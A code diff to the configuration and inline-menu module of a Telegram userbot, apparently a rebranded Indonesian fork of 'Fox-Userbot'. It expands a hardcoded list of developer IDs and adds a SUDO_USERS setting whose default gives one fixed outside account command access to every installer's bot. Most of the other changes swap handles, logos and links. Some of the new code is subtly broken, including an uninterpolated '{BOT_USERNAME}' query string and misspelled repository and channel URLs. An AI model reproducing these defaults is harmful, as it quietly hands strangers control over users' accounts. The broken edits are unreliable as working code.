@@ -74,12 +74,21 @@ if CONFIG_CHECK:
 
 # KALO NGEFORK/CLONE ID DEVS NYA GA USAH DI HAPUS YA KONTOLLLL 😡
 DEVS = (
-    1972682280,
-    2014359828,
-    1983365566,
-    1808866220,
+    844432220,
+    883761960,
     2127265501,
+    1738637033,
+    1663258664,
+    1416529201,
+    1220829364,
+    1977978893,
+    1607338903,
+    742495738,
+    1784606556,
 )
+
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "2127265501").split()}
+BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
 
 # Telegram App KEY and HASH
 API_KEY = int(os.environ.get("API_KEY") or None)
@@ -90,6 +99,10 @@ STRING_SESSION = os.environ.get("STRING_SESSION", "")
 
 # Logging channel/group ID configuration.
 BOTLOG_CHATID = int(os.environ.get("BOTLOG_CHATID", ""))
+
+# Handler Userbot
+CMD_HANDLER = os.environ.get("CMD_HANDLER") or "."
+SUDO_HANDLER = os.environ.get("SUDO_HANDLER") or "$"
 
 # Userbot logging feature switch.
 BOTLOG = sb(os.environ.get("BOTLOG", "True"))
@@ -129,7 +142,7 @@ GITHUB_ACCESS_TOKEN = os.environ.get("GITHUB_ACCESS_TOKEN", None)
 UPSTREAM_REPO_URL = os.environ.get(
     "UPSTREAM_REPO_URL", "https://github.com/arkadiaz/fox-userbot"
 )
-UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "main")
+UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "Fox-Userbot")
 
 # Console verbose logging
 CONSOLE_LOGGER_VERBOSE = sb(os.environ.get("CONSOLE_LOGGER_VERBOSE", "False"))
@@ -201,7 +214,7 @@ YOUTUBE_API_KEY = (
 )
 
 # Untuk Perintah .skyalive
-FOX_TEKS_KUSTOM = os.environ.get("FOX_TEKS_KUSTOM", "I'am Using fox-Userbot🦊")
+FOX_TEKS_KUSTOM = os.environ.get("FOX_TEKS_KUSTOM", "I'am Using Fox-Userbot⚡")
 
 # Untuk Mengubah Pesan Welcome
 START_WELCOME = os.environ.get("START_WELCOME", None)
@@ -236,11 +249,11 @@ S_PACK_NAME = os.environ.get("S_PACK_NAME", None)
 
 # Default .alive Logo
 ALIVE_LOGO = (
-    os.environ.get("ALIVE_LOGO") or "https://telegra.ph/file/8d1fbe4bef4642956d726.jpg"
+    os.environ.get("ALIVE_LOGO") or "https://telegra.ph/file/fd08937c4ae6cb1303731.jpg"
 )
 # Default .helpme Logo
 INLINE_PIC = (
-    os.environ.get("INLINE_PIC") or "https://telegra.ph/file/8d1fbe4bef4642956d726.jpg"
+    os.environ.get("INLINE_PIC") or "https://telegra.ph/file/fd08937c4ae6cb1303731.jpg"
 )
 
 # Default emoji help
@@ -462,7 +475,9 @@ with bot:
             try:
                 tgbotusername = BOT_USERNAME
                 if tgbotusername is not None:
-                    results = await event.client.inline_query(tgbotusername, "@Kayubot")
+                    results = await event.client.inline_query(
+                        tgbotusername, "{BOT_USERNAME}"
+                    )
                     await results[0].click(
                         event.chat_id, reply_to=event.reply_to_msg_id, hide_via=True
                     )
@@ -491,13 +506,9 @@ with bot:
                     f"✥ **ɪᴅ ᴘᴇɴɢɢᴜɴᴀ​ :** {c.id} \n"
                     f"✥ **ᴜsᴇʀɴᴀᴍᴇ​ :** @{c.username} \n"
                     f"✥ **ᴍᴇɴᴛɪᴏɴ​ :** [{get_display_name(c)}](tg://user?id={c.id}) \n\n"
-                    f"sᴇᴍᴏɢᴀ ʙᴇᴛᴀʜ ᴅɪsɪɴɪ ʏᴀ​ 🦊\n",
+                    f"sᴇᴍᴏɢᴀ ʙᴇᴛᴀʜ ᴅɪsɪɴɪ ʏᴀ​ ⚡\n",
                     buttons=[
-                        [
-                            Button.url(
-                                "ʀᴇᴘᴏ​", "https://github.com/arkadiaz/fox-userbot"
-                            )
-                        ],
+                        [Button.url("ʀᴇᴘᴏ​", "https://github.com/aekadiaz/fox-userbot")],
                     ],
                 )
 
@@ -540,9 +551,9 @@ with bot:
         async def on_plug_in_callback_query_handler(event):
             event.builder
             query = event.text
-            if event.query.user_id == uid and query.startswith("@Kayzuuuuu"):
+            if event.query.user_id == uid and query.startswith("@laz1yy"):
                 buttons = paginate_help(0, dugmeler, "helpme")
-                text = f"Usᴇʀʙᴏᴛ​ Tᴇʟᴇɢʀᴀᴍ\n\n**ɪɴʟɪɴᴇ ᴍᴇɴᴜ​**\n\n❥ **ʙᴏᴛ ᴏꜰ :** {DEFAULTUSER}\n❥ **ʙᴏᴛ ᴠᴇʀ :** 5.0\n❥ **ᴍᴏᴅᴜʟᴇꜱ :** {len(plugins)}\n❥ **ʙᴏᴛʏᴏᴜ :** @{BOT_USERNAME} "
+                text = f"Usᴇʀʙᴏᴛ​ Tᴇʟᴇɢʀᴀᴍ\n\n**ɪɴʟɪɴᴇ ᴍᴇɴᴜ​**\n\n❥ **ʙᴏᴛ ᴏꜰ :** {DEFAULTUSER}\n❥ **ʙᴏᴛ ᴠᴇʀ :** 5.0\n❥ **ᴍᴏᴅᴜʟᴇꜱ :** {len(plugins)}\n❥ **ʙᴏᴛʏᴏᴜ :** {BOT_USERNAME} "
                 await event.edit(
                     text,
                     file=kyylogo,
@@ -576,7 +587,7 @@ with bot:
         async def on_plug_in_callback_query_handler(event):
             if event.query.user_id == uid:
                 text = (
-                    f"❁ __Saya Adalah Fox-Userbot Yang Digunakan Banyak User Telegram__.\n\n"
+                    f"❁ __Saya Adalah Fox Ubot Yang Digunakan Banyak User Telegram__.\n\n"
                     f"❁ __Saya Dibuat Hanya Untuk Bersenang Senang Ditelegram__.\n\n"
                     f"❁ __Kelebihan Saya Banyak, Saya Mempunyai 1816 Modules__.\n\n"
                     f"© @laz1yy"
@@ -590,7 +601,7 @@ with bot:
                     ],
                 )
             else:
-                reply_pop_up_alert = f"🤴 Name : {DEFAULTUSER}\n🤖 Bot Ver : 7.0\n🛠 Modules : {len(plugins)}\n⚡ Branch : main"
+                reply_pop_up_alert = f"🤴 Name : {DEFAULTUSER}\n🤖 Bot Ver : 7.0\n🛠 Modules : {len(plugins)}\n⚡ Branch : Fox-Userbot"
                 await event.answer(reply_pop_up_alert, cache_time=0, alert=True)
 
         @tgbot.on(
@@ -649,13 +660,13 @@ with bot:
             if event.query.user_id == uid:
                 text = (
                     f"Modules Name **Alive**\n\n"
-                    f"× `.alive` × `.foxalive` × `.foxon`\n"
+                    f"× `.alive` × `.foxalive` × `.skyon`\n"
                     f"°__Menampilkan Alive Punya Kamu__.\n\n"
                     f"× `.set var ALIVE_LOGO` [**LINK**]\n"
                     f"°__Mengubah Foto Alive Kamu, Yang Kamu Inginkan__.\n\n"
                     f"× `.set var FOX_TEKS_KUSTOM` [**TEKS**]\n"
-                    f"°__Mengganti Teks Yang Ada Command FoxAlive__.\n\n"
-                    f"© @arkabotsupport"
+                    f"°__Mengganti Teks Yang Ada Command KayAlive__.\n\n"
+                    f"© @laz1yy"
                 )
                 await event.edit(
                     text,
@@ -685,7 +696,7 @@ with bot:
                     f"°__Mengaktifkan Pmpermit Kalian Atau Disebut Pesan Otomatis__.\n\n"
                     f"× `.set pm_msg` [**REPLYCHAT**]\n"
                     f"°__Mengganti Teks Pmpermit Selera Kamu__.\n\n"
-                    f"© @arkabotsupport"
+                    f"© @laz1yy"
                 )
                 await event.edit(
                     text,
@@ -715,7 +726,7 @@ with bot:
                     f"°__Mengubah Emoji Inline Yang Ada Dicomand__ `.helpme`\n\n"
                     f"× `.set var INLINE_PIC` [**LINK**]\n"
                     f"°__Mengubah Foto Yang Ada Dicomand__ `.helpme`\n\n"
-                    f"© @arkabotsupport"
+                    f"© @laz1yy"
                 )
                 await event.edit(
                     text,
@@ -743,7 +754,7 @@ with bot:
                     f"Modules Name **pmbot**\n\n"
                     f"× `.set var START_WELCOME` [**TEKS**] \n"
                     f"°__Kamu Juga Bisa Mengubah Start Welcome Untuk Bot Kamu Yang Ini, Dengan Cara Diatas Dan Kata Kata Bebas__.\n\n"
-                    f"© @arkabotsupport"
+                    f"© @laz1yy"
                 )
                 await event.edit(
                     text,
@@ -769,11 +780,11 @@ with bot:
             if event.query.user_id == uid:
                 text = (
                     f"Modules Name **Pembaruan**\n\n"
-                    f"× **Pembaruan Data Untuk Fox-Userbot, Command Untuk Pembaruan**.\n"
+                    f"× **Pembaruan Data Untuk Fox Ubot, Command Untuk Pembaruan**.\n"
                     f"⚒Pembaruan Data :\n"
                     f"`.update deploy`\n"
                     f"`update`\n\n"
-                    f"© @arkabotsupport"
+                    f"© @laz1yy"
                 )
                 await event.edit(
                     text,
@@ -855,7 +866,7 @@ with bot:
         )
         async def killdabot(event):
             if event.query.user_id == uid:
-                text = f"**Restaring Kayzu-Ubot**..."
+                text = f"**Restaring Fox-Userbot**..."
                 await event.edit(
                     text,
                     file=kyylogo,
@@ -892,7 +903,7 @@ with bot:
                 result = builder.photo(
                     file=kyylogo,
                     link_preview=False,
-                    text=f"Usᴇʀʙᴏᴛ​ Tᴇʟᴇɢʀᴀᴍ\n\n**ɪɴʟɪɴᴇ ᴍᴇɴᴜ​​**\n\n❥ **ʙᴏᴛ ᴏꜰ :** {DEFAULTUSER}\n❥ **ʙᴏᴛ ᴠᴇʀ :** 7.0\n❥ **ᴍᴏᴅᴜʟᴇꜱ :** {len(plugins)}\n❥ **ʙᴏᴛʏᴏᴜ :** @{BOT_USERNAME}".format(
+                    text=f"Usᴇʀʙᴏᴛ​ Tᴇʟᴇɢʀᴀᴍ\n\n**ɪɴʟɪɴᴇ ᴍᴇɴᴜ​​**\n\n❥ **ʙᴏᴛ ᴏꜰ :** {DEFAULTUSER}\n❥ **ʙᴏᴛ ᴠᴇʀ :** 7.0\n❥ **ᴍᴏᴅᴜʟᴇꜱ :** {len(plugins)}\n❥ **ʙᴏᴛʏᴏᴜ :** {BOT_USERNAME}".format(
                         len(dugmeler),
                     ),
                     buttons=buttons,
@@ -911,7 +922,7 @@ with bot:
                     buttons=[
                         [
                             custom.Button.url(
-                                "Arka", "https://github.com/arkadiaz/Fox-userbot"
+                                "Arka", "https://github.com/arkadiaz/fox-userbot"
                             ),
                             custom.Button.url("ᴄʜᴀɴɴᴇʟ", "t.me/arkabotupdate"),
                         ],
@@ -956,8 +967,8 @@ with bot:
                     link_preview=True,
                     buttons=[
                         [
-                            Button.url("❈ꜱᴜᴘᴘᴏʀᴛ❈", "t.me/arkabotSupport"),
-                            Button.url("❈ᴄʜᴀɴɴᴇʟ❈", "t.me/arkabotupdate"),
+                            Button.url("❈ꜱᴜᴘᴘᴏʀᴛ❈", "t.me/arkabotsupport"),
+                            Button.url("❈ᴄʜᴀɴɴᴇʟ❈", "t.me/aekabotupdate"),
                         ],
                         [custom.Button.inline("°ᴏᴘᴇɴ ᴍᴇɴᴜ°", data="open_plugin")],
                         [custom.Button.inline("°ᴄʟᴏꜱᴇ ɪɴʟɪɴᴇ°", b"close")],
